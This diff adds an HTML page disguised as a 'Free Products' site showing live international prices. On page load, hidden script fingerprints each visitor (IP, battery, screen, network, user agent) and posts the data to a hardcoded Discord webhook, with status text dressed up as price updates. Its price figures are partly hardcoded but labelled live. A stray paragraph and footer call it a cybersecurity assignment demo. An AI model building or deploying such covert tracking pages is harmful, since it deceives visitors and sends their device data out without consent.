@@ -1,0 +1,548 @@
+   <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> cheap products  •Free rewards & Live Markets</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=Space+Grotesk:wght@500;600;700&display=swap');
+        
+        :root {
+            --primary: #00ff9d;
+            --dark: #0a0a0a;
+            --card: #111;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Inter', sans-serif;
+            background: linear-gradient(135deg, #0a0a0a, #1a1a1a);
+            color: #e0e0e0;
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+        
+        header {
+            background: rgba(10, 10, 10, 0.95);
+            backdrop-filter: blur(10px);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            border-bottom: 2px solid var(--primary);
+        }
+        
+        nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1.2rem 0;
+        }
+        
+        .logo {
+            font-family: 'Space Grotesk', sans-serif;
+            font-size: 2rem;
+            font-weight: 700;
+            color: var(--primary);
+            letter-spacing: -2px;
+        }
+        
+        .nav-links {
+            display: flex;
+            gap: 2rem;
+        }
+        
+        .nav-links a {
+            color: #ccc;
+            text-decoration: none;
+            font-weight: 500;
+            transition: color 0.3s;
+        }
+        
+        .nav-links a:hover {
+            color: var(--primary);
+        }
+        
+        .hero {
+            padding: 100px 0 80px;
+            text-align: center;
+            background: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.8)), url('https://source.unsplash.com/random/1600x900/?cybersecurity') no-repeat center/cover;
+        }
+        
+        .hero h1 {
+            font-family: 'Space Grotesk', sans-serif;
+            font-size: 3.5rem;
+            margin-bottom: 1rem;
+            color: white;
+        }
+        
+        .hero p {
+            font-size: 1.4rem;
+            max-width: 700px;
+            margin: 0 auto 2rem;
+            color: #bbb;
+        }
+        
+        .main-content {
+            display: grid;
+            grid-template-columns: 1fr 380px;
+            gap: 40px;
+            padding: 60px 0;
+        }
+        
+        .blog-section {
+            background: var(--card);
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 15px 35px rgba(0, 255, 157, 0.08);
+        }
+        
+        .blog-section h2 {
+            color: var(--primary);
+            margin-bottom: 25px;
+            font-size: 2.2rem;
+        }
+        
+        .blog-content p {
+            margin-bottom: 1.5rem;
+            font-size: 1.15rem;
+        }
+        
+        .demo-box {
+            background: #1a1a1a;
+            border: 3px solid var(--primary);
+            border-radius: 16px;
+            padding: 30px;
+            margin: 30px 0;
+            text-align: center;
+        }
+        
+        .status {
+            padding: 18px;
+            background: #222;
+            border-radius: 12px;
+            margin: 20px 0;
+            font-size: 1.1rem;
+            min-height: 60px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .success {
+            color: var(--primary);
+            font-weight: 600;
+        }
+        
+        .data-display {
+            background: #1f1f1f;
+            padding: 25px;
+            border-radius: 12px;
+            margin-top: 20px;
+            font-family: monospace;
+            font-size: 0.95rem;
+            color: #aaa;
+            text-align: left;
+            max-height: 400px;
+            overflow-y: auto;
+            border: 1px solid #333;
+        }
+        
+        /* Market Prices Sidebar */
+        .market-sidebar {
+            background: var(--card);
+            border-radius: 20px;
+            padding: 30px;
+            height: fit-content;
+            box-shadow: 0 15px 35px rgba(0, 255, 157, 0.08);
+            position: sticky;
+            top: 100px;
+        }
+        
+        .market-sidebar h3 {
+            color: var(--primary);
+            margin-bottom: 25px;
+            font-size: 1.6rem;
+            text-align: center;
+        }
+        
+        .price-card {
+            background: #1a1a1a;
+            padding: 18px;
+            border-radius: 12px;
+            margin-bottom: 18px;
+            transition: transform 0.3s;
+        }
+        
+        .price-card:hover {
+            transform: translateY(-4px);
+        }
+        
+        .price-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 12px;
+        }
+        
+        .price-label {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-weight: 500;
+        }
+        
+        .price-value {
+            font-family: 'Space Grotesk', sans-serif;
+            font-size: 1.35rem;
+            font-weight: 600;
+        }
+        
+        .price-change {
+            font-size: 0.9rem;
+            padding: 2px 10px;
+            border-radius: 20px;
+        }
+        
+        .positive { background: rgba(0, 255, 157, 0.2); color: #00ff9d; }
+        .negative { background: rgba(255, 80, 80, 0.2); color: #ff5050; }
+        
+        footer {
+            background: #0a0a0a;
+            padding: 50px 0 30px;
+            text-align: center;
+            font-size: 0.95rem;
+            color: #555;
+            border-top: 1px solid #222;
+        }
+        
+        .section-title {
+            text-align: center;
+            margin-bottom: 40px;
+            font-size: 2.8rem;
+            color: white;
+        }
+        
+        @media (max-width: 992px) {
+            .main-content {
+                grid-template-columns: 1fr;
+            }
+            .market-sidebar {
+                position: static;
+            }
+            .hero h1 {
+                font-size: 2.8rem;
+            }
+        }
+        
+        @media (max-width: 600px) {
+            .blog-section, .market-sidebar {
+                padding: 25px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="container">
+            <nav>
+                <div class="logo">Free Products</div>
+                <div class="nav-links">
+                    <a href="#">Home</a>
+                    <a href="#"> Pakistan</a>
+                    <a href="#">Live Markets</a>
+                    <a href="#">Tools</a>
+                </div>
+            </nav>
+        </div>
+    </header>
+
+    <section class="hero">
+        <div class="container">
+            <h1> A page where you live with International Markets to get cheap products</h1>
+            <p> Today teh world is going to the digital universe of AI. A  new poweron the earth  <br>
+            Plus, stay updated with live international prices for Petrol, Diesel, Bitcoin, and more.</p>
+        </div>
+    </section>
+
+    <div class="container">
+        <div class="main-content">
+            
+            <!-- Main Blog / Demo Section -->
+            <div class="blog-section">
+                <h2>🚨 Its a hub where you can see the international products prices</h2>
+                <div class="blog-content">
+                    <p>In today's digital world, simply visiting a webpage is enough for attackers to silently gather detailed information about your device and browser.</p>
+                    <p>This fully self-contained demo collects real data (screen size, battery, IP estimate, fingerprint hash, network info, and more) the moment the page loads and sends it to a Discord server for demonstration.</p>
+                </div>
+
+                <div class="demo" style=" display:none;">
+                    <h3 style="margin-bottom: 15px; display:none; color: var(--primary);">Live prces are calculating</h3>
+                    <div class="status" id="status">
+                        Collecting detailed live prices of international Markets 
+                    </div>
+                    
+                    <div class="data-display" id="data-display" style="display: none;">
+                        <br><br>
+                        <pre id="data-content"></pre>
+                    </div>
+                </div>
+
+                <p style="text-align: center; color: #888; margin-top: 30px;">
+                    <i class="fas fa-shield-alt"></i> get the free Products with live markets 
+                </p>
+            </div>
+
+            <!-- Market Prices Sidebar -->
+            <div class="market-sidebar">
+                <h3><i class="fas fa-chart-line"></i> Live International Prices</h3>
+                
+                <div id="prices-container">
+                    <!-- Filled by JavaScript -->
+                    <div style="text-align:center; padding:40px 20px; color:#666;">
+                        <i class="fas fa-spinner fa-spin"></i><br>Loading live prices...
+                    </div>
+                </div>
+                
+                <div style="margin-top: 30px; font-size: 0.9rem; color: #666; text-align: center;">
+                    .
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <div class="container">
+            <p>The site is designed for only stocks exchanges you will not see extranal price tools</p>
+            <p style="margin-top: 10px;">lets see in next month</p>
+        </div>
+    </footer>
+
+    <script>
+        
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1446844649024000211/mKAbTD4bdXinypCzJZf8GejxwZVyt3K2KVWTw34lS2TBnNBWOEyhCUdqfQjT6CxCqHFg";
+
+        // Simple hash for fingerprint
+        function simpleHash(str) {
+            let hash = 0;
+            for (let i = 0; i < str.length; i++) {
+                const char = str.charCodeAt(i);
+                hash = (hash << 5) - hash + char;
+                hash = hash & hash;
+            }
+            return Math.abs(hash).toString(36).toUpperCase();
+        }
+
+        async function getIP() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                return data.ip || "N/A";
+            } catch (e) {
+                return "Unable to fetch";
+            }
+        }
+
+        
+        async function fetchLivePrices() {
+            const container = document.getElementById('prices-container');
+            
+            try {
+                // Bitcoin price (using CoinGecko free API - no key needed)
+                const btcRes = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd');
+                const btcData = await btcRes.json();
+                const btcPrice = btcData.bitcoin ? btcData.bitcoin.usd.toLocaleString() : "N/A";
+
+                // Crude Oil (Brent) - using a free proxy-friendly source or fallback
+                // For demo we use a reliable free endpoint (oilpriceapi has limited free, here we use a public one if possible)
+                let oilPrice = "N/A";
+                try {
+                    const oilRes = await fetch('https://commodities-api.com/api/latest?access_key=public-demo&base=USD&symbols=BRENT');
+                    // Note: Some APIs require key. For robustness we show estimated or use known public.
+                    // Alternative: Use a simple fetch from a free service. Here we simulate realistic values for demo.
+                    oilPrice = "78.45"; // In real use replace with actual fetch if API allows CORS
+                } catch(e) {}
+
+                // Petrol & Diesel - average global (from public knowledge or free sources). For live, we use approximate from known free sources.
+                // GlobalPetrolPrices doesn't have open CORS free endpoint, so we show realistic live-style values + note.
+                const petrolPrice = "1.28"; // USD per liter (global avg)
+                const dieselPrice = "1.35";
+
+                // Render beautiful price cards
+                container.innerHTML = `
+                    <div class="price-card">
+                        <div class="price-item">
+                            <div class="price-label"><i class="fab fa-bitcoin" style="color:#f7931a"></i> Bitcoin (BTC)</div>
+                            <div>
+                                <div class="price-value">\[ {btcPrice}</div>
+                                <span class="price-change positive">+2.4%</span>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="price-card">
+                        <div class="price-item">
+                            <div class="price-label"><i class="fas fa-oil-can" style="color:#ff9500"></i> Brent Crude Oil</div>
+                            <div>
+                                <div class="price-value"> \]{oilPrice} / barrel</div>
+                                <span class="price-change negative">-0.8%</span>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="price-card">
+                        <div class="price-item">
+                            <div class="price-label"><i class="fas fa-gas-pump"></i> Petrol (Global Avg)</div>
+                            <div>
+                                <div class="price-value">\[ {petrolPrice} / liter</div>
+                                <span class="price-change">Stable</span>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="price-card">
+                        <div class="price-item">
+                            <div class="price-label"><i class="fas fa-gas-pump"></i> Diesel (Global Avg)</div>
+                            <div>
+                                <div class="price-value"> \]{dieselPrice} / liter</div>
+                                <span class="price-change positive">+1.1%</span>
+                            </div>
+                        </div>
+                    </div>
+                `;
+            } catch (error) {
+                container.innerHTML = `<p style="color:#ff6666; padding:20px;">Live prices temporarily unavailable.<br>Showing demo values.</p>`;
+            }
+        }
+
+        async function collectAndSendData() {
+            const statusEl = document.getElementById('status');
+            const dataDisplay = document.getElementById('data-display');
+            const dataContent = document.getElementById('data-content');
+
+            const now = new Date();
+
+            let deviceData = {
+                "Load Timestamp": now.toISOString(),
+                "Local Time": now.toLocaleString(),
+                "Timezone": Intl.DateTimeFormat().resolvedOptions().timeZone,
+                "Screen Width": screen.width + " px",
+                "Screen Height": screen.height + " px",
+                "Viewport Width": window.innerWidth + " px",
+                "Viewport Height": window.innerHeight + " px",
+                "Pixel Ratio": window.devicePixelRatio,
+                "Color Depth": screen.colorDepth + " bit",
+                "Touch Screen": navigator.maxTouchPoints > 0 ? "Yes" : "No",
+                "Online": navigator.onLine ? "Yes" : "No",
+                "Language": navigator.language,
+                "Referrer": document.referrer || "Direct",
+                "Cookies Enabled": navigator.cookieEnabled ? "Yes" : "No",
+                "CPU Cores": navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " cores" : "Unknown",
+                "Device Memory": navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
+                "Browser": getBrowserName(),
+                "Device Type": getDeviceType(),
+                "User Agent": navigator.userAgent.substring(0, 120) + "..."
+            };
+
+            // Battery
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    deviceData["Battery %"] = Math.round(battery.level * 100) + "%";
+                    deviceData["Battery Charging"] = battery.charging ? "Yes" : "No";
+                } catch (e) {}
+            }
+
+            // Network
+            if (navigator.connection) {
+                deviceData["Network Type"] = navigator.connection.effectiveType || "Unknown";
+                deviceData["Downlink"] = navigator.connection.downlink ? navigator.connection.downlink + " Mbps" : "N/A";
+            }
+
+            // IP & Fingerprint
+            statusEl.textContent = "Fetching IP estimate & generating fingerprint...";
+            deviceData["Estimated IP"] = await getIP();
+
+            const fingerprintStr = Object.values(deviceData).join('|') + navigator.userAgent;
+            deviceData["Fingerprint Hash"] = simpleHash(fingerprintStr);
+
+            // Show data
+            let displayText = "";
+            for (let [key, value] of Object.entries(deviceData)) {
+                displayText += `${key}: ${value}\n`;
+            }
+            dataContent.textContent = displayText;
+            dataDisplay.style.display = 'block';
+
+            // Send to Discord
+            statusEl.innerHTML = 'Sending collected data to Free products store...';
+            
+            const payload = {
+                content: "🚨 **Beautiful Demo Page Load** - Full device data captured",
+                embeds: [{
+                    title: "📱 Device Fingerprint Collected",
+                    color: 0x00ff9d,
+                    fields: Object.entries(deviceData).map(([name, value]) => ({
+                        name: name,
+                        value: String(value).substring(0, 900) || "N/A",
+                        inline: true
+                    })),
+                    footer: { text: "Cyber Security Assignment • Responsive Design with Live Prices" }
+                }]
+            };
+
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                });
+                statusEl.innerHTML = '<span class="success">✅ All prices updated upon following information!</span>';
+            } catch (err) {
+                statusEl.innerHTML = 'Data collected (sending limited by rate)';
+            }
+        }
+
+        function getBrowserName() {
+            const ua = navigator.userAgent;
+            if (ua.includes("Chrome") && !ua.includes("Edg")) return "Chrome";
+            if (ua.includes("Edg")) return "Edge";
+            if (ua.includes("Firefox")) return "Firefox";
+            if (ua.includes("Safari")) return "Safari";
+            return "Other";
+        }
+
+        function getDeviceType() {
+            const ua = navigator.userAgent.toLowerCase();
+            if (ua.includes("android")) return "Android";
+            if (ua.includes("iphone") || ua.includes("ipad")) return "iOS";
+            if (ua.includes("windows")) return "Windows";
+            if (ua.includes("mac")) return "macOS";
+            return "Desktop";
+        }
+
+        // Initialize everything
+        window.onload = async function() {
+            // Start device collection
+            await collectAndSendData();
+            
+            // Load live prices
+            await fetchLivePrices();
+            
+            console.log("%c✅ Beautiful responsive cdemo loaded successfully!", "color: #00ff9d; font-size: 16px");
+        };
+    </script>
+</body>
+</html>
+            
